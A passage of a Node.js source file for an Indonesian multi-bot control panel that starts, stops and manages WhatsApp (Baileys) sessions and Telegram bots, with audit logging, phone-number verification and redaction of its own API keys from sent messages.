  } catch (error) {
    console.error("WATCHDOG REPORT ERROR:", error.message)
  }
}

async function startSession(name, options = {}){
  const existing = global.sessionSockets.get(name)

  if (existing) {
    console.log(chalk.yellow(`Session ${name} already running`))
    return existing
  }

  console.log(chalk.blue(`Starting bot session: ${name}`))
  appendSessionAudit(name, "start_requested")
  writeSessionRuntimeLog(name, "start requested")
  global.enableWaSessionRecovery = true

  return await waSocket({
    ...options,
    sessionName: name
  })

}









function getBots(){
  if(!fs.existsSync(TELEGRAM_SESSION_DIR)) return []
  return fs.readdirSync(TELEGRAM_SESSION_DIR).filter(v => v.endsWith(".json"))
}

function getTelegramBotConfig(name) {
  const fileName = name.endsWith(".json") ? name : `${name}.json`
  const filePath = `${TELEGRAM_SESSION_DIR}/${fileName}`

  if (!fs.existsSync(filePath)) return null

  try {
    const data = JSON.parse(fs.readFileSync(filePath, "utf8"))
    const stats = fs.statSync(filePath)
    const botName = (data?.name || fileName.replace(/\.json$/i, "")).trim()
    return {
      ...data,
      name: botName,
      path: filePath,
      file: fileName,
      hasToken: Boolean(String(data?.token || "").trim()),
      isRunning: global.telegramBots.has(botName),
      createdAt: data?.createdAt || stats.birthtime.toISOString(),
      updatedAt: data?.updatedAt || stats.mtime.toISOString(),
      lastStartedAt: data?.lastStartedAt || null,
      lastStoppedAt: data?.lastStoppedAt || null,
      auditLog: Array.isArray(data?.auditLog) ? data.auditLog : []
    }
  } catch {
    return null
  }
}

function findTelegramBotByToken(token, exceptName = "") {
  const cleanToken = String(token || "").trim()
  const excluded = String(exceptName || "").trim().toLowerCase()

  if (!cleanToken) return null

  for (const file of getBots()) {
    const name = file.replace(/\.json$/i, "")
    if (excluded && name.toLowerCase() === excluded) continue

    const config = getTelegramBotConfig(name)
    if (!config) continue
    if (String(config.token || "").trim() === cleanToken) {
      return config
    }
  }

  return null
}

function saveTelegramBotConfig(name, token, extra = {}) {
  const cleanName = String(name || "").trim()
  const cleanToken = String(token || "").trim()
  const path = `${TELEGRAM_SESSION_DIR}/${cleanName}.json`
  const current = getTelegramBotConfig(cleanName)
  const now = new Date().toISOString()

  fs.writeFileSync(path, JSON.stringify({
    name: cleanName,
    token: cleanToken,
    createdAt: current?.createdAt || now,
    updatedAt: now,
    lastStartedAt: current?.lastStartedAt || null,
    lastStoppedAt: current?.lastStoppedAt || null,
    auditLog: current?.auditLog || [],
    ...extra
  }, null, 2))

  return path
}

function appendTelegramBotAudit(name, action, extra = {}) {
  const current = getTelegramBotConfig(name)
  if (!current) return null

  saveTelegramBotConfig(name, current.token, {
    ...current,
    updatedAt: new Date().toISOString(),
    auditLog: [
      {
        action,
        at: new Date().toISOString(),
        ...extra
      },
      ...(current.auditLog || [])
    ].slice(0, 25)
  })

  return getTelegramBotConfig(name)
}

global.telegramBots = new Map()

async function registerTelegramFeatures(bot, name) {
  const featureFiles = fs.existsSync(TELEGRAM_FEATURE_ABS_DIR)
    ? fs.readdirSync(TELEGRAM_FEATURE_ABS_DIR)
        .filter(file => file.endsWith(".js"))
        .sort((a, b) => a.localeCompare(b))
    : []

  let loaded = 0

  for (const file of featureFiles) {
    const modulePath = fileURLToPath(new URL(`./telegram/${file}`, import.meta.url))

    try {
      const featureModule = await importModule(modulePath)
      const registerFeature = featureModule?.registerTelegramFeature || featureModule?.default

      if (typeof registerFeature !== "function") {
        console.log(chalk.yellow(`[TELEGRAM FEATURE] skip ${file} (registerTelegramFeature tidak ditemukan)`))
        continue
      }

      await registerFeature(bot, name)
      loaded++
    } catch (error) {
      console.log(chalk.red(`[TELEGRAM FEATURE] gagal memuat ${file}: ${error.message}`))
    }
  }

  console.log(chalk.green(`[TELEGRAM FEATURE] ${loaded} fitur dimuat untuk bot ${name}`))
}

function showTelegramStartLog(name) {
  console.log(chalk.green(`Starting Botz Telegram: ${name}`))
  console.log(chalk.hex("#00e5ff")("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"))
  console.log(chalk.hex("#00e5ff")("┃       [ TELEGRAM SESSION STARTING ]         ┃"))
  console.log(chalk.hex("#00e5ff")("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"))
  console.log(chalk.yellow(`
# Time WIB: ${chalk.green(moment().tz("Asia/Jakarta").format("HH:mm:ss DD/MM/YYYY"))}
# Session: ${chalk.green(name)}
# Status: ${chalk.green("Initializing Telegram bot...")}
`))
}

function showTelegramConnectLog(name, info) {
  const username = info?.username ? `@${info.username}` : "-"
  const firstName = info?.first_name || name
  const botId = info?.id || "-"

  console.log(chalk.hex("#00ff9d")("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"))
  console.log(chalk.hex("#00ff9d")("┃      [ TELEGRAM SESSION CONNECTED ]         ┃"))
  console.log(chalk.hex("#00ff9d")("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"))
  console.log(chalk.yellow(`
# Time WIB: ${chalk.green(moment().tz("Asia/Jakarta").format("HH:mm:ss DD/MM/YYYY"))}
# Platform: ${chalk.green(os.platform())} (${os.arch()})
# Memory: ${chalk.green(((os.totalmem() - os.freemem()) / os.totalmem() * 100).toFixed(2))}% used
# Uptime: ${chalk.green(formatUptime(os.uptime()))}
# Node.js: ${chalk.green(process.version)}
# Bot Name: ${chalk.green(firstName)}
# Username: ${chalk.green(username)}
# Bot ID: ${chalk.green(String(botId))}
# Session: ${chalk.green(name)}
`))
}

function logTelegramUpdate(name, ctx) {
  const hasRelevantPayload = Boolean(
    ctx.message?.text ||
    ctx.message?.caption ||
    ctx.callbackQuery?.data ||
    ctx.inlineQuery?.query
  )

  if (!hasRelevantPayload) {
    return
  }

  const messageText = String(
    ctx.message?.text ||
    ctx.message?.caption ||
    ctx.callbackQuery?.data ||
    ctx.inlineQuery?.query ||
    "-"
  )

  const trimmedText = messageText.length > 300
    ? `${messageText.slice(0, 300)} ... (truncated)`
    : messageText

  const updateType = ctx.updateType || "-"
  const chatType = ctx.chat?.type || "-"
  const chatId = ctx.chat?.id || "-"
  const userId = ctx.from?.id || "-"
  const firstName = ctx.from?.first_name || "-"
  const username = ctx.from?.username ? `@${ctx.from.username}` : "-"
  const command = messageText.startsWith("/")
    ? messageText.split(/\s+/)[0]
    : "-"
  const time = moment().tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss [WIB]")

  console.log(chalk.cyan("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
  console.log(chalk.bold.greenBright("TELEGRAM BOT LOGGER"))
  console.log(chalk.cyan("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
  console.log(chalk.yellow("Bot Session      :"), chalk.whiteBright(name))
  console.log(chalk.yellow("Update Type      :"), chalk.whiteBright(updateType))
  console.log(chalk.yellow("User             :"), chalk.whiteBright(firstName))
  console.log(chalk.yellow("Username         :"), chalk.whiteBright(username))
  console.log(chalk.yellow("User ID          :"), chalk.whiteBright(String(userId)))
  console.log(chalk.yellow("Chat ID          :"), chalk.whiteBright(String(chatId)))
  console.log(chalk.yellow("Chat Type        :"), chalk.whiteBright(chatType))
  console.log(chalk.yellow("Command          :"), chalk.whiteBright(command))
  console.log(chalk.yellow("Time             :"), chalk.whiteBright(time))
  console.log(chalk.cyan("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
  console.log(chalk.whiteBright(trimmedText))
  console.log(chalk.cyan("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"))
}

async function startTelegramBot(name, token){

  if(global.telegramBots.has(name)){
    console.log(`⚠️ Bot ${name} sudah running`)
    return
  }

  if (global.telegramBotStarting.has(name)) {
    console.log(`⏳ Bot ${name} sedang dalam proses start`)
    return
  }

  try {
    global.telegramBotStarting.add(name)
    const { Telegraf } = await import("telegraf")
    const cleanToken = String(token || "").trim()

    if(!cleanToken){
      throw new Error("token kosong")
    }

    const duplicateBot = findTelegramBotByToken(cleanToken, name)
    if (duplicateBot) {
      throw new Error(`token Telegram sudah dipakai bot lain: ${duplicateBot.name}`)
    }

    showTelegramStartLog(name)
    global.telegramBotConfigs.set(name, cleanToken)
    if (getTelegramBotConfig(name)) {
      appendTelegramBotAudit(name, "start_requested")
    }

    const bot = new Telegraf(cleanToken)
    global.telegramBots.set(name, bot)

    bot.use(async (ctx, next) => {
      try {
        logTelegramUpdate(name, ctx)
      } catch (error) {
        console.log(`💥 Logger Telegram ${name} error:`, error.message)
      }

      return next()
    })

    await registerTelegramFeatures(bot, name)

    bot.catch((err)=>{
      console.log(`💥 Bot ${name} error:`, err.message)
    })

    const launchResult = await Promise.race([
      bot.launch({
        dropPendingUpdates: false,
        handleSignals: false
      }).then(() => "launched"),
      new Promise((resolve) => {
        setTimeout(() => resolve("timeout"), 15000)
      })
    ])

    if (launchResult === "timeout") {
      console.log(chalk.yellow(`⚠️ Bot ${name} launch timeout, diasumsikan aktif dan proses lanjut.`))
    }

    let me = null

    try {
      me = await Promise.race([
        bot.telegram.getMe(),
        new Promise((resolve) => {
          setTimeout(() => resolve(null), 5000)
        })
      ])
    } catch (error) {
      console.log(chalk.yellow(`⚠️ Bot ${name} aktif, tetapi getMe gagal: ${error.message}`))
    }

    const currentConfig = getTelegramBotConfig(name)
    if (currentConfig) {
      saveTelegramBotConfig(name, currentConfig.token, {
        ...currentConfig,
        lastStartedAt: new Date().toISOString()
      })
      appendTelegramBotAudit(name, "started")
    }
    showTelegramConnectLog(name, me || { first_name: name, username: "-", id: "-" })

    console.log(`✔ Bot ${name} berhasil jalan`)
    return bot

  } catch (e) {
    console.log(`❌ Gagal start bot ${name}:`, e.message)
    const bot = global.telegramBots.get(name)
    if (bot) {
      try {
        await bot.stop()
      } catch {
      }
      global.telegramBots.delete(name)
    }
    return null
  } finally {
    global.telegramBotStarting.delete(name)
  }
}

async function stopBotz(name){
  const bot = global.telegramBots.get(name)

  if(!bot){
    console.log("❌ Bot tidak ditemukan")
    return
  }

  await bot.stop()
  global.telegramBots.delete(name)
  global.telegramBotConfigs.delete(name)
  global.telegramBotStarting.delete(name)
  const currentConfig = getTelegramBotConfig(name)
  if (currentConfig) {
    saveTelegramBotConfig(name, currentConfig.token, {
      ...currentConfig,
      lastStoppedAt: new Date().toISOString()
    })
    appendTelegramBotAudit(name, "stopped")
  }

  console.log(`🛑 Bot ${name} dihentikan`)
}

async function deleteTelegramBot(name) {
  const filePath = `${TELEGRAM_SESSION_DIR}/${name}.json`

  if (global.telegramBots.has(name)) {
    await stopBotz(name)
  }

  if (fs.existsSync(filePath)) {
    appendTelegramBotAudit(name, "deleted")
    fs.unlinkSync(filePath)
  }

  global.telegramBotConfigs.delete(name)
}








async function panel(context) {
  if (context && typeof context === 'object' && Object.keys(context).length > 0) {
    return await panelCore(context);
  }
  return await panelCore({
    getSessions,
    getBots,
    chooseSession,
    addSession,
    removeSession,
    startAllBots,
    chooseBotz,
    addBotz,
    removeBotz,
    startAllBotz,
    startAllBotzAndSessions,
    startSession,
    startTelegramBot,
    waSocket,
    getDefaultSessionConfig,
    stopBotz
  });
}

async function startAllBots(){

  const sessions = getSessions()

  if(!sessions.length){
    console.log(chalk.red("No session"))
    return panel()
  }

  console.log(chalk.blue("Starting all bot sessions...\n"))

  for (let s of sessions){

    const path = `${SESSION_DIR}/${s}/creds.json`

    if(fs.existsSync(path)){
      console.log(chalk.green(`Starting ${s}`))
      await startSession(s, { allowAuthPrompt: false })
    } else {
      console.log(chalk.yellow(`Skip ${s} (not logged in)`))
    }

  }

}
async function addSession(){

  const name = await question(chalk.cyan("╭─ Nama sesi baru\n╰─› "))

  if(!name) return panel()

  const botname = await question(chalk.cyan("╭─ Nama bot untuk sesi ini\n╰─› "))

  const path = `${SESSION_DIR}/${name}`

  if(fs.existsSync(path)){
    console.log(chalk.red("✖ Nama sesi sudah dipakai, pilih nama lain."))
    return panel()
  }

  fs.mkdirSync(path)

  fs.writeFileSync(
    `${path}/config.json`,
    JSON.stringify({
      ...getDefaultSessionConfig(name),
      botname: botname || "FreeZeeHost Bot"
    }, null, 2)
  )

  console.log(chalk.green(`✔ Sesi '${name}' berhasil dibuat.`))

  console.log(chalk.blue("⏳ Menyiapkan proses login sesi..."))

  await waSocket({
    allowAuthPrompt: true,
    sessionName: name
  })

}
async function removeSession(){

  const sessions = getSessions()

  if(!sessions.length){
    console.log(chalk.red("Belum ada sesi yang bisa dihapus."))
    return panel()
  }

  console.log(chalk.yellow("\n╔═ Daftar Sesi Yang Bisa Dihapus ═╗"))
  sessions.forEach((s,i)=>{
    console.log(`${i+1}. ✦ ${s}`)
  })

  const choose = await question(chalk.cyan("╰─› Pilih nomor sesi yang mau dihapus: "))

  const target = sessions[choose-1]

  if(!target) return panel()

  fs.rmSync(`${SESSION_DIR}/${target}`, {recursive:true, force:true})

  console.log(chalk.yellow("✔ Sesi berhasil dihapus dari daftar."))

  return panel()

}
async function chooseSession(){

  const sessions = getSessions()

  if(!sessions.length){
    console.log(chalk.red("Belum ada sesi yang tersedia untuk dijalankan."))
    return panel()
  }

  console.log(chalk.hex("#00ff9d")("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"))
  console.log(chalk.hex("#00ff9d")("┃      [ SESSION BOOT SELECTOR : ARMED ]      ┃"))
  console.log(chalk.hex("#00ff9d")("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"))
  sessions.forEach((s,i)=>{

    const status = fs.existsSync(`${SESSION_DIR}/${s}/creds.json`)
      ? chalk.hex("#00ff66")("● ONLINE SESSION")
      : chalk.hex("#ff3b3b")("○ OFFLINE SHELL")

      console.log(
        chalk.whiteBright(`[${String(i + 1).padStart(2, "0")}]`) +
        chalk.gray(" :: ") +
        chalk.cyanBright(s.padEnd(18)) +
        chalk.gray(" >> ") +
        status
      )

  })

  const choose = await question(chalk.hex("#00e5ff")("\nroot@session-panel ~# execute target botz : "))

  const target = sessions[choose-1]

  if(!target) return panel()

  const hasCreds = fs.existsSync(`${SESSION_DIR}/${target}/creds.json`)

  await startSession(target, {
    allowAuthPrompt: !hasCreds
  })

}

// ===== FREEZEEHOST MULTI BOT PANEL TELEGRAM =====

const TELEGRAM_FEATURE_DIR = "./telegram"
const TELEGRAM_FEATURE_ABS_DIR = fileURLToPath(new URL("./telegram/", import.meta.url))

if (!fs.existsSync(TELEGRAM_FEATURE_DIR)) {
  fs.mkdirSync(TELEGRAM_FEATURE_DIR)
}

if (!fs.existsSync(TELEGRAM_SESSION_DIR)) {
  fs.mkdirSync(TELEGRAM_SESSION_DIR)
}

if (fs.existsSync(TELEGRAM_FEATURE_DIR)) {
  const legacyTelegramFiles = fs.readdirSync(TELEGRAM_FEATURE_DIR).filter(v => v.endsWith(".json"))

  for (const file of legacyTelegramFiles) {
    const oldPath = `${TELEGRAM_FEATURE_DIR}/${file}`
    const newPath = `${TELEGRAM_SESSION_DIR}/${file}`

    if (!fs.existsSync(newPath)) {
      fs.renameSync(oldPath, newPath)
    }
  }
}
async function addBotz(){
  console.log(chalk.hex("#00ff9d")("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"))
  console.log(chalk.hex("#00ff9d")("┃         [ FORGE NEW BOT : TELEGRAM ]        ┃"))
  console.log(chalk.hex("#00ff9d")("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"))

  const name = (await question(chalk.hex("#00e5ff")("root@bot-forge ~# input bot name  : "))).trim()
  const token = (await question(chalk.hex("#00e5ff")("root@bot-forge ~# input bot token : "))).trim()

  if(!name || !token) return panel()

  const path = `${TELEGRAM_SESSION_DIR}/${name}.json`

  if(fs.existsSync(path)){
    console.log("❌ Nama bot sudah ada")
    return panel()
  }

  fs.writeFileSync(path, JSON.stringify({ name, token }, null, 2))

  console.log("✔ Bot berhasil ditambahkan")

  return panel()
}
async function chooseBotz(){
  const bots = getBots()

  if(!bots.length){
    console.log("❌ Tidak ada bot")
    return panel()
  }

  console.log(chalk.hex("#00ff9d")("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"))
  console.log(chalk.hex("#00ff9d")("┃      [ SESSION BOOT SELECTOR : ARMED ]      ┃"))
  console.log(chalk.hex("#00ff9d")("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"))
  bots.forEach((b,i)=>{
    const botName = b.replace(/\.json$/i, "")
    const status = global.telegramBots.has(botName)
      ? chalk.hex("#00ff66")("● ONLINE SESSION")
      : chalk.hex("#ff3b3b")("○ OFFLINE SHELL")

    console.log(
      chalk.whiteBright(`[${String(i + 1).padStart(2, "0")}]`) +
      chalk.gray(" :: ") +
      chalk.cyanBright(botName.padEnd(18)) +
      chalk.gray(" >> ") +
      status
    )
  })

  const choose = await question(chalk.hex("#00e5ff")("\nroot@session-panel ~# execute target session : "))
  const file = bots[choose-1]

  if(!file) return panel()

  try {
    const data = JSON.parse(fs.readFileSync(`${TELEGRAM_SESSION_DIR}/${file}`))
    await startTelegramBot(data.name, data.token)
  } catch {
    console.log("❌ File rusak")
  }
}
async function removeBotz(){
  const bots = getBots()

  if(!bots.length){
    console.log("❌ Tidak ada bot")
    return panel()
  }

  console.log(chalk.hex("#00ff9d")("\n┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"))
  console.log(chalk.hex("#00ff9d")("┃      [ SESSION BOOT SELECTOR : ARMED ]      ┃"))
  console.log(chalk.hex("#00ff9d")("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"))
  bots.forEach((b,i)=>{
    const botName = b.replace(/\.json$/i, "")
    const status = global.telegramBots.has(botName)
      ? chalk.hex("#00ff66")("● ONLINE SESSION")
      : chalk.hex("#ff3b3b")("○ OFFLINE SHELL")

    console.log(
      chalk.whiteBright(`[${String(i + 1).padStart(2, "0")}]`) +
      chalk.gray(" :: ") +
      chalk.cyanBright(botName.padEnd(18)) +
      chalk.gray(" >> ") +
      status
    )
  })

  const choose = await question(chalk.hex("#00e5ff")("\nroot@session-panel ~# execute target botz : "))
  const file = bots[choose-1]

  if(!file) return panel()

  const name = file.replace(".json","")

  await stopBotz(name)

  fs.unlinkSync(`${TELEGRAM_SESSION_DIR}/${file}`)

  console.log("✔ Bot dihapus")

  return panel()
}
async function startAllBotz(){
  const bots = getBots()

  if(!bots.length){
    console.log("❌ Tidak ada bot")
    return
  }

  console.log("🚀 Starting all telegram bots...\n")
  const results = []

  for (let file of bots){
    try {
      const filePath = `${TELEGRAM_SESSION_DIR}/${file}`
      const data = JSON.parse(fs.readFileSync(filePath, "utf8"))
      const botName = String(data?.name || file.replace(/\.json$/i, "")).trim()
      const botToken = String(data?.token || "").trim()

      if (!botName || !botToken) {
        console.log(`❌ File bot tidak valid: ${file}`)
        results.push({ name: botName || file, status: "invalid" })
        continue
      }

      let startedBot = await startTelegramBot(botName, botToken)

      if (!startedBot && !global.telegramBots.has(botName)) {
        console.log(`🔁 Retry start bot Telegram: ${botName}`)
        await new Promise(r => setTimeout(r, 1200))
        startedBot = await startTelegramBot(botName, botToken)
      }

      if (global.telegramBots.has(botName)) {
        results.push({ name: botName, status: "started" })
      } else {
        console.log(`❌ Bot ${botName} gagal aktif setelah retry`)
        results.push({ name: botName, status: "failed" })
      }

      await new Promise(r => setTimeout(r, 2000)) // Jeda 2 detik antar bot Telegram

    } catch (error) {
      console.log(`❌ File rusak: ${file} (${error.message})`)
      results.push({ name: file, status: "corrupt" })
    }
  }

  const success = results.filter(v => v.status === "started").length
  const failed = results.length - success

  console.log(`✔ Start bot Telegram selesai. Berhasil: ${success}, Gagal: ${failed}`)
}

async function startAllBotzAndSessions(){

  console.log("🚀 Starting ALL systems...\n")

  await global.startAllSessions()

  await new Promise(r => setTimeout(r, 2000))

  await startAllBotz()

  console.log("🔥 ALL SYSTEM ONLINE")
}

// ===== END PANEL =====

global.startSession = async (name, phoneNumber = null, options = {}) => {
  return startSession(name, {
    allowAuthPrompt: true,
    phoneNumber,
    ...options
  })
}

global.stopSession = async (name) => {
  const conn = global.sessionSockets.get(name)

  if (!conn) return false

  global.sessionIntents.set(name, "stop")

  try {
    await conn.ws.close()
  } catch {
  }

  saveSessionConfig(name, {
    lastStoppedAt: new Date().toISOString()
  })
  appendSessionAudit(name, "stopped_manual")
  global.sessionSockets.delete(name)
  return true
}

global.deleteSession = async (name) => {
  const targetPath = `${SESSION_DIR}/${name}`

  if (global.sessionSockets.has(name)) {
    global.sessionIntents.set(name, "delete")
    await global.stopSession(name)
  }

  if (!fs.existsSync(targetPath)) return false

  appendSessionAudit(name, "deleted")
  fs.rmSync(targetPath, { recursive: true, force: true })
  global.sessionIntents.delete(name)
  return true
}

global.listSessions = () => getSessions().map(getSessionInfo)
global.listTelegramBots = () => getBots().map((file) => {
  const name = file.replace(/\.json$/i, "")
  return getTelegramBotConfig(name) || {
    name,
    file,
    isRunning: global.telegramBots.has(name),
    hasToken: false
  }
})
global.getTelegramBotConfig = getTelegramBotConfig
global.addTelegramBot = async (name, token) => {
  const cleanName = String(name || "").trim()
  const cleanToken = String(token || "").trim()

  if (!cleanName || !cleanToken) {
    throw new Error("nama atau token kosong")
  }

  if (getTelegramBotConfig(cleanName)) {
    throw new Error(`bot ${cleanName} sudah ada`)
  }

  const duplicateBot = findTelegramBotByToken(cleanToken, cleanName)
  if (duplicateBot) {
    throw new Error(`token Telegram sudah dipakai bot ${duplicateBot.name}`)
  }

  saveTelegramBotConfig(cleanName, cleanToken, {
    lastStartedAt: null,
    lastStoppedAt: null,
    auditLog: []
  })
  appendTelegramBotAudit(cleanName, "created")
  return getTelegramBotConfig(cleanName)
}
global.deleteTelegramBot = async (name) => deleteTelegramBot(String(name || "").trim())
global.startTelegramBotByName = async (name) => {
  const botConfig = getTelegramBotConfig(String(name || "").trim())
  if (!botConfig?.hasToken) {
    throw new Error("bot tidak ditemukan atau token kosong")
  }
  await startTelegramBot(botConfig.name, botConfig.token)
  return getTelegramBotConfig(botConfig.name)
}
global.stopTelegramBot = async (name) => {
  await stopBotz(String(name || "").trim())
  return getTelegramBotConfig(String(name || "").trim())
}
global.restartTelegramBot = async (name) => {
  const botName = String(name || "").trim()
  const botConfig = getTelegramBotConfig(botName)
  if (!botConfig?.hasToken) {
    throw new Error("bot tidak ditemukan atau token kosong")
  }
  if (botConfig.isRunning) {
    await stopBotz(botName)
  }
  await startTelegramBot(botName, botConfig.token)
  appendTelegramBotAudit(botName, "restarted")
  return getTelegramBotConfig(botName)
}
global.getSessionConfig = getSessionConfig
global.saveSessionConfig = saveSessionConfig
global.appendSessionAudit = appendSessionAudit

global.startAllSessions = async () => {
  const results = []
  const sessions = getSessions();

  console.log(chalk.cyan(`🚀 [SYSTEM] Memulai ${sessions.length} sesi WhatsApp secara bergiliran...`));

  for (const name of sessions) {
    const info = getSessionInfo(name)

    if (info.isRunning) {
      results.push({ name, status: "running" })
      continue
    }

    if (!info.hasCreds) {
      results.push({ name, status: "no_creds" })
      continue
    }

    try {
        await startSession(name, { allowAuthPrompt: false })
        results.push({ name, status: "started" })
        
        // --- SEQUENTIAL STARTUP ---
        // Tunggu sampai bot ini online sebelum lanjut ke bot berikutnya
        await waitSessionStable(name);
    } catch (e) {
        console.error(chalk.red(`❌ [SYSTEM] Gagal memulai sesi ${name}:`), e.message);
        results.push({ name, status: "error", error: e.message });
    }
  }

  console.log(chalk.green("✅ [SYSTEM] Seluruh antrean sesi telah diproses."));
  return results
}

async function waSocket(options = {}) {
  displayBanner();
  const {
    allowAuthPrompt = false,
    phoneNumber = null,
    authMethod = null,
    sessionName = "default"
  } = options;
  const sessionPath = sessionName
  ? `./sessions/${sessionName}`
  : "./sessions/default"
  const credsPath = `${sessionPath}/creds.json`

const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
  // Hardcode version to a stable one to avoid "invisible message" bug
  const { version } = await fetchLatestBaileysVersion();

  let useQR = !fs.existsSync(credsPath);
  let pairing = false;
  let verifiedPhoneNumber = phoneNumber;
  let phoneVerified = false;
  if (!useQR) {
    console.log(chalk.green("[AUTH] File sesi ditemukan, login otomatis dimulai..."));
  } else if (allowAuthPrompt) {
    let authChoice = "0"

    if (authMethod === "pairing") {
      authChoice = "1"
    } else if (authMethod === "qr") {
      authChoice = "2"
    } else {
      authChoice = await question(chalk.hex("#00e5ff")("┏━━━━━━━━━━━━━━━━━━ AUTH GATE PROTOCOL ━━━━━━━━━━━━━━━━━━┓\n┃ [1] pairing-code  :: fast link injection              ┃\n┃ [2] qr-scan       :: manual visual handshake          ┃\n┃ [0] back          :: abort and return to console      ┃\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\nroot@auth-gate ~# select vector (0/1/2) : "));
    }

    if (authChoice === "0") {
      console.log(chalk.yellow("[AUTH] Oke, balik ke menu sebelumnya."));
      return panel()
    }
    const authPhoneInput = verifiedPhoneNumber || await question(
      chalk.hex("#00e5ff")("root@db-firewall ~# input whatsapp number (628xx) : ")
    )
    verifiedPhoneNumber = authPhoneInput.replace(/\D/g, "")

    if (!verifiedPhoneNumber) {
      console.log(chalk.red("[DB] Nomor kosong. Akses autentikasi dibatalkan."));
      return panel()
    }

    if (isDevNumber(verifiedPhoneNumber)) {
      phoneVerified = true
      console.log(chalk.green(`[DEV] Nomor ${verifiedPhoneNumber} terdeteksi sebagai dev.`))
      console.log(chalk.green("[DEV] Melewati verifikasi DB. Selamat datang kembali dev."))
    } else {
      console.log(chalk.cyan("[DB] Memverifikasi nomor ke database pusat..."))

      const allowed = await verifyNumberDB(verifiedPhoneNumber)

      if (!allowed) {
        console.log(chalk.red(`[DB] Nomor ${verifiedPhoneNumber} tidak terdaftar. Auth gate ditutup.`))
        return panel()
      }

      phoneVerified = true
      console.log(chalk.green(`[DB] Nomor ${verifiedPhoneNumber} valid. Auth gate dibuka.`))
    }

    if (authChoice === "1") {
      pairing = true;
      useQR = false;
    } else {
      useQR = true;
    }
  } else {
    console.log(chalk.yellow(`[AUTH] Sesi ${sessionName || "default"} belum login, jadi sementara dilewati.`));
    return null;
  }

  // --- CLEANUP & RESOURCE MANAGEMENT ---
  clearSessionIntervals(sessionName);

  const store = makeInMemoryStore({ 
    logger: pino().child({ level: 'silent', stream: 'store' }) 
  });
  store.readFromFile(`./sessions/${sessionName}_store.json`);
  addSessionInterval(sessionName, setInterval(() => {
    store.writeToFile(`./sessions/${sessionName}_store.json`);
  }, 10000));

  const conn = makeWASocket({
    logger: pino({ level: "silent" }),
    printQRInTerminal: useQR,
    version,
    auth: state,
    browser: Browsers.ubuntu("Chrome"),
    syncFullHistory: false,
    markOnlineOnConnect: false, // Kurangi pressure server
    shouldSyncHistoryGroupMessages: () => false, // Hemat RAM: Jangan sync history grup
    connectTimeoutMs: 60_000,
    keepAliveIntervalMs: 30_000,
    defaultQueryTimeoutMs: 60_000, // Tambahkan timeout agar tidak gampang putus
    retryRequestDelayMs: 500,
    cachedGroupMetadata: async (jid) => store.groupMetadata[jid],
    getMessage: async (key) => {
      if (store) {
        const msg = await store.loadMessage(key.remoteJid, key.id)
        return msg?.message || undefined
      }
      return undefined
    }
  });
  store.bind(conn.ev);

  // --- STABILITY HEARTBEAT (Keep-Alive) ---
  addSessionInterval(sessionName, setInterval(async () => {
    if (conn.user && global.sessionSockets.has(sessionName)) {
        try {
            // Update presence secara berkala untuk menjaga koneksi tetap "Hot"
            await conn.sendPresenceUpdate('available');
            // Log latency internal (silent)
            await conn.query({ tag: 'iq', attrs: { type: 'get', xmlns: 'w:p', to: '@s.whatsapp.net' }, content: [{ tag: 'ping', attrs: {} }] });
        } catch (e) {}
    }
  }, 3 * 60 * 1000)); // Setiap 3 menit

  // --- STORE GARBAGE COLLECTOR (RAM Management) ---
  addSessionInterval(sessionName, setInterval(() => {
    if (typeof conn.autoOptimize === 'function') conn.autoOptimize();
    
    if (store && store.groupMetadata) {
        const groupCount = Object.keys(store.groupMetadata).length;
        if (groupCount > 500) { // Jika metadata grup > 500, reset sebagian untuk hemat RAM
            console.log(chalk.gray(`[STORE] Cleaning group metadata cache (${groupCount} entries)...`));
            store.groupMetadata = {}; 
        }
    }
  }, 6 * 60 * 60 * 1000)); // Setiap 6 jam


  // --- CREDENTIAL GUARD (ANTI-LEAK) ---
  const censorSecrets = (text) => {
    if (typeof text !== 'string') return text;
    let sanitized = text;
    const secrets = [
      global.googleAiApiKey,
      global.alyachan,
      global.neoxr,
      global.capikey,
      global.apikey,
      global.mongoUrl,
      global.cftoken,
      process.env.GOOGLE_AI_KEY,
      process.env.MONGO_URL,
      ...(global.geminiKeys || [])
    ].filter(s => s && s.length > 5);

    for (const secret of new Set(secrets)) {
      const escaped = secret.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      sanitized = sanitized.replace(new RegExp(escaped, 'g'), '********');
    }
    return sanitized;
  };

  // --- BAILEYS INVISIBLE FIX & SECURITY INTERCEPTOR ---
  const originalSendMessage = conn.sendMessage;

  conn.sendMessage = async (jid, content, options = {}) => {
    // 1. Redact Secrets in Text
    if (content?.text) content.text = censorSecrets(content.text);
    if (content?.caption) content.caption = censorSecrets(content.caption);
    if (content?.extendedTextMessage?.text) content.extendedTextMessage.text = censorSecrets(content.extendedTextMessage.text);

    // 1.5. Global HD Label for Media
